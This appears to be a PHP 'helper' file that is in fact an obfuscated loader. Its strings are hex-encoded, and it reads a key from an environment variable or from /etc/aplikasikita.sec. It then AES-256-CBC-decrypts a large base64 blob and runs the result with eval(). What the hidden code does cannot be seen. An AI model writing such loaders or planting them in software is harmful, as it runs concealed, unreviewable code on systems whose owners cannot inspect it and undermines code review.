<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ICLczBLnpFbDiQzTJIxs0g==');

$c=base64_decode(

'C020/ezLO+uagQMpVA8feiQsXjJcS03BwuOPcVaaK9q8bDAo2dkMgunouTYCNtN0+42bHtbeiP2q' .
'ITxZzPkUjmflbkIUIlQDovkfqg54PHEgyQEwOuf2cZIPhY8mgQCterjuggugxAnQiyZtRsS8qRpZ' .
'rdKBK0ATSDOcrQ4V6jPL00HucIvYF9fTBZdIJ3QTNeZNSum9PKTWwxR2YnBAtDDjRdBD24ZqqZV6' .
'Rmiof4+b89fYx2bBvbugz+Q8cvaGZe7j0xpCrtTn63yAoui2NSLZyg1U+UUx/n63+DMGB6GmRPua' .
'juUIku1QQ+ovTTY87Pp8400GnZo0Xkh/ygolMFj5pwpKxOSagD5tbYWEkqgEBXpB9yraIPcX7X58' .
'Gr1WRN7hrKxKnNk77U4SED4AWs9+wBQxFk3JQBDjhrdHjxlh2UsAkm6oBo6lJ/2AQXfF5L5tU+YA' .
'FEV80/t6bQndfRxfQtHfpnDBZTCe4DipyTl1b1cD/rpd9c30CUkPmugZuaLAW0hxYrOWUZeweQDG' .
'wuTRa2OSFjtLGJctN9pAfFTwpf8ZDP7RR77SFTDSrOthzhoeYrGwQ4PzbDgqcWllEUMeCzHB66HL' .
'4cyrZcNOBfXma/hpRXWV4BZqF+jHWsmY4MNhKHfBPVVI4MFl7u10nKcBSuJ0bnyDPIuY/SGQbL2t' .
'qfXjGv4PZy/1NJtceRm83NmsMEX2Yko3NLhEdEbZdtjMo0Lq02of2/eCAo8D5hGQ5lGO2I+VJvo9' .
'ls32oqIZhibYQAETTghx3kyB6YbvLOkrx/VDk6EOl6AvPivIye52WcR+fTaPWcWBDzubCYh0ek71' .
'0aH521MWz5hQEMpRSb9K3mjURccV1h6I4E9Eq2AFCSTMhw+oZnIamezoo5w+1Tpbhc9/xi7lVw9K' .
'7RoyEKKlwJRn1qBUWWjVU+B+YsXWxhUHCTm2jZtwTnQ7PsSTil7PGvxTlEc0Ldg3MnKo6fTyDkfh' .
'kK+DBOF9W/IoCogLgbA7GKfycX3fkLNRoYDkj+1hduUKCqnfkAHoFCXm6snG2PfCoufXUNTOeoqi' .
'pA/cd3c+U3NeyX0aN3y45/aw8Alkdf9m2CmieIYVRHNU0dBDm8qAPXKtRUc1i0+OtzrbEpdgt8qO' .
'bttAJpkdI+nlVHb3LK285Dd52XJytF2S7ekP1VDZLLPLTxzIQDdmuZxe862b/rWA5fWkZcGe3K51' .
'LHkb6GxtduAFf8x6SOEQzgIbwmqgwWywRub8kE0tBput7pexUMLBubgjsyRgloKVxxp9NnHknOV9' .
'J4HqeyayplIzLpNH/k3WYAE7SDO/u9qzywY2i0WEtiTOFGRDzSN5Rzz5a4NJlG8njW0NhVaHd6iF' .
's/SVHWnLaIDltVJko/OabjVMhYouPPi0NR7DUEc3d2idHVGs1COuF1hfZ9N6GN9rZ1y3piuMk4Ca' .
'MF79VRj4leZS7PXG4R6qjKydINjQmcLBtzxj3D2fKaILmZvxohNrIDWFRKLV9MTlsSrdpMu9+fM4' .
'X3KinMyGJeyS6K7wgJMZmAOTreOGwSiT5PGdO/LtpsqVkqff/naFLJ6GfzK2ux1tT/qqi46IRLh4' .
'CwK41r3E3MCeipI/rrmv+MYhbw4BqQwCMoL5BcyLYwQuJMgcw21pgE3joXveSqa+MYhWopeTtAm/' .
'erIYBpNYNMpzmdOD7MZaElGxORzPXgNxO6SKaoDB15WrJuuVr6nPsEdiER3POykuvRjvqeQfkaEg' .
'C6HPR2W+J3k7P0gHYXSMFqVhkAQgy/LBCI5Nb2d1izH209pqmtU+XeNKbRitAHXnqTIEHJbC/7LB' .
'xC7b4owz/G5K1U8xBrMC4B2D1hRjkrdlJDpeo96ZG0FI3sTCk/o45/at//ilIqLPG1rV/ccAlsN1' .
'v327zOhxI6Ch3ffWxAaBo1wfWUhdiDbysewD3UGJaL7Dj5PAEuh3lelEMuA5Aoihv/8dkz0TNQqE' .
'06nwkYd+H6qcjUs1NYuvriN/lLxt/hx/oiufqO4VljQt6Tm0Z8s7uPnd5YbWqiL+lydmtBMQkCwS' .
'8pW5WidfxryavEVo9YCq0szkJg5+U4lIpun3gOAPdleSLPbezjZqECsPHIPmb1JhEkddlxcikGER' .
'IX8225QxUAEmmSD6P0I4QjcaS5r8OY5QYC0RfPgmoSRrRq6q'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

